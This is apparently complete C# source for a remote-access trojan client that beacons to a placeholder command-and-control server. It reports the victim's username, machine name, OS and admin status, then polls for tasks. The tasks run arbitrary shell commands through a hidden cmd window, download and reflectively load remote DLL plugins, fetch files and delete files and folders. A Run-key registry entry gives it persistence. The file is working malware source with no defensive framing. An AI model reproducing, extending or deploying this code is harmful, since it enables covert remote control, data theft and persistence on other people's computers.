using System;
using System.IO;
using System.Net;
using System.Text;
using System.Security.Principal;
using System.Threading;
using System.Text.Json;
using System.Reflection;
using Microsoft.Win32;


// Class to get Data from server
public class ServerData
{
    public int id { get; set; }
    public string command { get; set; }
    public string args { get; set; }
    public string type { get; set; }
    public string pluginargs { get; set; }
}


// Class to send data to server
public class ResponseData
{
    public int task_id { get; set; }
    public string output { get; set; }
    public string error { get; set; }
}


// Main class to receive orders and send data
namespace Client_CC
{
    class Client
    {
        // UNIQUE ID
        private static readonly string ID = GenerateId(12);
        private static readonly Functions functions = new Functions();

        static void Main(string[] args)
        {

            ServicePointManager  .ServerCertificateValidationCallback +=  (sender, cert, chain, sslPolicyErrors) => true;
            string url = "http://xx.xx.xx.xx:yyyy";

            connection(url);
            pooling(url);
        }

        private static void connection(string url)
        {
            //Get data
            string username = Environment.UserName;
            string computername = Environment.MachineName;
            OperatingSystem os_info = System.Environment.OSVersion;
            string os = GetOsName(os_info);
            string arch = "64bits";
            bool is32bits = !string.IsNullOrEmpty(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432"));
            if (is32bits)
            {
                arch = "32bits";
            }
            int admin = 0;
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                bool check = principal.IsInRole(WindowsBuiltInRole.Administrator);
                if (check)
                {
                    admin = 1;
                }
            }
            // TODO
            string av = "Windows Defender";
            string jsonString = "{ \"name\": \"" + ID + "\", " +
                               "     \"os\":  \"" + os + "\", " +
                               "     \"arch\": \"" + arch + "\", " +
                              "      \"username\": \"" + username + "\"," +
                               "     \"computername\": \"" + computername + "\", " +
                                "    \"av\":  \"" + av + "\", " +
                                "    \"isadmin\":  \"" + admin + "\" " +
                                "}";

            //First request to init connection
            while (true)
            {
                try
                {
                    doPost(url + "/new", jsonString);
                    break;
                }
                catch
                {
                    Thread.Sleep(5 * 1000);
                }
            }

        }

        private static void doPost(string url, string data)
        {
            WebRequest request = WebRequest.Create(url);
            request.Method = "POST";
            request.ContentType = "text/json";
            using (var streamWriter = new StreamWriter(request.GetRequestStream()))
            {
                streamWriter.Write(data);
            }
            var httpResponse = (HttpWebResponse)request.GetResponse();
            using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
            {
                var responseText = streamReader.ReadToEnd();
            }
        }

        private static void pooling(string url)
        {
            int seconds_to_pooling = 5;
            bool follow = true;
            int error = 0;
            while (follow)
            {
                Thread.Sleep(seconds_to_pooling * 1000);
                try
                {
                    ServerData data = checkURL(url);
                    error = 0;
                    if (data.id == 0)
                    {
                        continue;
                    }

                    if (data.command == "terminate")
                    {
                        follow = false;
                        continue;
                    }

                    string jsonString = treatServerData(data);
                    if (jsonString != "")
                    {
                        doPost(url + "/result/" + ID, jsonString);
                    }
                }
                catch
                {
                    error += 1;
                    if (error == 5)
                    {
                        follow = false;
                    }
                }
            }
        }

        private static string treatServerData(ServerData data)
        {
            ResponseData response = new ResponseData();
            response.task_id = data.id;
            string command = data.command;
            string typeCommand = data.type;
            if (typeCommand == "command")
            {
                string result = ExcuteCommand(command);
                if (result == "")
                {
                    response.error = "Something was wrong";
                }
                response.output = result;

            }
            else if (typeCommand.StartsWith("function"))
            {
                (string, string) dataResult;
                MethodInfo method = typeof(Functions).GetMethod(command);
                dataResult = ((string, string))method.Invoke(null, new object[] { data });

                if (dataResult.Item2 == "")
                {
                    response.output = dataResult.Item1;
                    response.error = "";
                }
                else
                {
                    response.error = dataResult.Item2;
                    response.output = "";
                }
            }
            else
            {
                return "";
            }
            return JsonSerializer.Serialize<ResponseData>(response);
        }

        private static ServerData checkURL(string url)
        {
            WebRequest request = WebRequest.Create(url + "/" + ID); ;
            Stream objStream = request.GetResponse().GetResponseStream();
            StreamReader objReader = new StreamReader(objStream);

            string sLine = "";
            int i = 0;

            while (true)
            {
                i++;
                string data = objReader.ReadLine();
                if (data == null) break;
                sLine += data;
                sLine += "\n";

            }
            return JsonSerializer.Deserialize<ServerData>(sLine);
        }


        private static string GetOsName(OperatingSystem os_info)
        {
            // check http://csharphelper.com/blog/2017/10/get-the-computers-operating-system-in-c/
            string os;
            string version =
                os_info.Version.Major.ToString() + "." +
                os_info.Version.Minor.ToString();
            switch (version)
            {
                case "10.0":
                    os = "10/Server 2016";
                    break;
                case "6.3":
                    os = "8.1/Server 2012 R2";
                    break;
                case "6.2":
                    os = "8/Server 2012";
                    break;
                case "6.1":
                    os = "7/Server 2008 R2";
                    break;
                case "6.0":
                    os = "Server 2008/Vista";
                    break;
                case "5.2":
                    os = "Server 2003 R2/Server 2003/XP 64-Bit Edition";
                    break;
                case "5.1":
                    os = "XP";
                    break;
                case "5.0":
                    os = "2000";
                    break;
                default:
                    os = "Unknown";
                    break;
            }
            return "Windows " + os;
        }

        private static string GenerateId(int size)
        {
            StringBuilder builder = new StringBuilder();
            Random random = new Random();
            char ch;
            for (int i = 0; i < size; i++)
            {
                ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));
                builder.Append(ch);
            }
            return builder.ToString();
        }

        // Execute Command
        private static String ExcuteCommand(object command)
        {
            try
            {

                System.Diagnostics.ProcessStartInfo procStartInfo =
                    new System.Diagnostics.ProcessStartInfo("cmd", "/c " + command);

                procStartInfo.RedirectStandardOutput = true;
                procStartInfo.UseShellExecute = false;
                procStartInfo.CreateNoWindow = true;
                System.Diagnostics.Process proc = new System.Diagnostics.Process();
                proc.StartInfo = procStartInfo;
                proc.Start();
                return proc.StandardOutput.ReadToEnd();

            }
            catch (Exception ex)
            {
                return ex.ToString();
            }
        }

    }

    // Class for defining functions
    public class Functions
    {

        public static (string, string) LoadPlugin(ServerData serverData)
        {
            string plugin = serverData.args;
            string plugin_args = serverData.pluginargs;
            int CHUNK_SIZE = 1000000;
            string data = "";
            string error = "";
            string[] value = plugin.Split(" ");
            string url = value[0] + value[1] + ".dll";
            WebClient client = new WebClient();
            Stream stream = client.OpenRead(url);
            BinaryReader binReader = new BinaryReader(stream);
            byte[] content = binReader.ReadBytes(CHUNK_SIZE);

            string pluginClass = value[1] + ".Plugin";

            Assembly loadplugin = Assembly.Load(content);
            if (loadplugin != null)
            {

                Type myType = loadplugin.GetType(pluginClass);
                object extobj = Activator.CreateInstance(myType);

                if (plugin_args != "")
                {
                    data = (string)extobj.GetType().InvokeMember("Run", BindingFlags.InvokeMethod, Type.DefaultBinder, extobj, new object[] { plugin_args });
                }
                else
                {
                    data = (string)extobj.GetType().InvokeMember("Run", BindingFlags.InvokeMethod, Type.DefaultBinder, extobj, null);
                }

            }
            else
            {
                error = "Error loading plugin";
            }
            return (data, error);
        }


        public static (string, string) UploadFile(ServerData serverData)
        {
            string url = serverData.args;
            string data = "";
            string error = "";
            try
            {
                string[] value = url.Split(" ");
                using (WebClient wc = new WebClient())
                {
                    wc.DownloadFileAsync(
                        new System.Uri(value[0] + "/" + value[1]), value[1]);
                }
                data = "The file " + value[1] + " has been uploaded";
            }
            catch (Exception ex)
            {
                error = ex.ToString();
            }
            return (data, error);
        }

        public static (string, string) CreatePersistenceReg(ServerData serverData)
        {
            string data = "";
            string error = "";
            string fName = "Client-CC.exe";
            try
            {
                data = addRegKey(copyFile(fName));
            }
            catch (Exception ex)
            {
                error = ex.ToString();
            }
            return (data, error);

        }

        public static (string, string) DeletePersitenceReg(ServerData serverData)
        {
            string data = "";
            string error = "";
            string fName = "Client-CC.exe";
            try
            {
                data = deleteFilePriv(fName) + " " + delRegKey();
            }
            catch (Exception ex)
            {
                error = ex.ToString();
            }
            return (data, error);

        }

        public static (string, string) GetCurrentDirectory(ServerData serverData)
        {
            return (Directory.GetCurrentDirectory(), "");
        }

        public static (string, string) GetFiles(ServerData serverData)
        {
            string[] filePaths = Directory.GetFiles(@".");
            string data = "";
            foreach (string f in filePaths)
            {
                data += f;
                data += "\n";
            }
            return (data, "");
        }

        public static (string, string) DeleteDirectory(ServerData serverData)
        {
            string dir = serverData.args;
            string data = "";
            string error = "";
            if (Directory.Exists(dir))
            {
                try
                {
                    Directory.Delete(dir);
                    data = dir + " has been deleted";
                }
                catch (Exception e)
                {
                    error = e.ToString();
                }
            }
            else
            {
                error = dir + " doesn't exist";
            }
            return (data, error);
        }

        public static (string, string) DeleteFile(ServerData serverData)
        {
            string fName = serverData.args;
            string data = "";
            string error = "";
            if (File.Exists(fName))
            {
                try
                {
                    File.Delete(fName);
                    data = "The file " + fName + " has been deleted";
                }
                catch (Exception e)
                {
                    error = e.ToString();
                }
            }
            else
            {
                error = "The file " + fName + " was not found";
            }
            return (data, error);
        }

        public static (string, string) ChangeCurrentDirectory(ServerData serverData)
        {
            string dir = serverData.args;
            string data = "";
            string error = "";
            try
            {
                //Set the current directory.
                Directory.SetCurrentDirectory(dir);
                data = "The current directory now is " + dir;
            }
            catch (DirectoryNotFoundException e)
            {
                error = e.ToString();
            }
            return (data, error);
        }


        private static string copyFile(string fName)
        {
            string destination = Directory.GetParent(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)).FullName;
            if (Environment.OSVersion.Version.Major >= 6)
            {
                string source = Directory.GetCurrentDirectory();
                destination = Directory.GetParent(destination).ToString() + "\\AppData";
                File.Copy(Path.Combine(source, fName), Path.Combine(destination, fName), true);

            }
            return Path.Combine(destination, fName);
        }

        private static string addRegKey(string data)
        {
            RegistryKey currentUser = Registry.CurrentUser;
            currentUser = currentUser.OpenSubKey(@"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            currentUser.CreateSubKey("Hello");
            currentUser.SetValue("Hello", data, RegistryValueKind.String);
            currentUser.Close();
            return "Done";
        }

        private static string deleteFilePriv(string fName)
        {
            string destination = Directory.GetParent(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)).FullName;
            if (Environment.OSVersion.Version.Major >= 6)
            {
                destination = Directory.GetParent(destination).ToString() + "\\AppData";

                if (File.Exists(Path.Combine(destination, fName)))
                {
                    File.Delete(Path.Combine(destination, fName));
                    return "File Deleted.";
                }
            }
            return "No file Found";
        }
        private static string delRegKey()
        {
            RegistryKey currentUser = Registry.CurrentUser;
            currentUser = currentUser.OpenSubKey(@"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            currentUser.DeleteValue("Hello");
            currentUser.Close();
            return "Registry Deleted.";
        }

    }

}
